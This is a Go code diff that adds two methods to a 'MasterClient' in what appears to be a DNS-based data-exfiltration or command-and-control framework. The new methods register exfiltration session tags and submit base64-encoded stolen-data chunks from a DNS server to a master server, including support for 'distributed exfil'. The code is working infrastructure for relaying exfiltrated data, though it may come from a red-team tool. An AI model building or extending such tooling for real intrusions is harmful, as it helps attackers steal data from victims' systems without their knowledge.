@@ -473,6 +473,69 @@ func (mc *MasterClient) SubmitExfilChunk(req ExfilChunkRequest) (bool, error) {
 	return sessionComplete, nil
 }
 
+// RegisterExfilTag registers a session tag with the Master Server
+func (mc *MasterClient) RegisterExfilTag(tag string, sessionID string) error {
+	req := map[string]interface{}{
+		"dns_server_id": mc.serverID,
+		"api_key":       mc.apiKey,
+		"tag":           tag,
+		"session_id":    sessionID,
+	}
+
+	respData, err := mc.doRequest("POST", "/api/dns-server/exfil/tag", req)
+	if err != nil {
+		return fmt.Errorf("exfil tag registration failed: %w", err)
+	}
+
+	var resp APIResponse
+	if err := json.Unmarshal(respData, &resp); err != nil {
+		return fmt.Errorf("failed to parse exfil tag response: %w", err)
+	}
+
+	if !resp.Success {
+		return fmt.Errorf("exfil tag registration rejected: %s", resp.Message)
+	}
+
+	return nil
+}
+
+// SubmitExfilChunkByTag submits a chunk using only the tag (for distributed exfil)
+func (mc *MasterClient) SubmitExfilChunkByTag(tag string, chunkIndex int, payloadB64 string) (bool, error) {
+	req := map[string]interface{}{
+		"dns_server_id": mc.serverID,
+		"api_key":       mc.apiKey,
+		"tag":           tag,
+		"chunk_index":   chunkIndex,
+		"payload_b64":   payloadB64,
+	}
+
+	respData, err := mc.doRequest("POST", "/api/dns-server/exfil/chunk/tagged", req)
+	if err != nil {
+		return false, fmt.Errorf("tagged exfil chunk submit failed: %w", err)
+	}
+
+	var resp APIResponse
+	if err := json.Unmarshal(respData, &resp); err != nil {
+		return false, fmt.Errorf("failed to parse tagged exfil chunk response: %w", err)
+	}
+
+	if !resp.Success {
+		return false, fmt.Errorf("tagged exfil chunk rejected: %s", resp.Message)
+	}
+
+	// Check if session is complete
+	sessionComplete := false
+	if dataMap, ok := resp.Data.(map[string]interface{}); ok {
+		if complete, exists := dataMap["completed"]; exists {
+			if completeBool, ok := complete.(bool); ok {
+				sessionComplete = completeBool
+			}
+		}
+	}
+
+	return sessionComplete, nil
+}
+
 // MarkExfilComplete notifies the Master Server that a session finished transferring
 func (mc *MasterClient) MarkExfilComplete(req ExfilCompleteRequest) error {
 	req.DNSServerID = mc.serverID
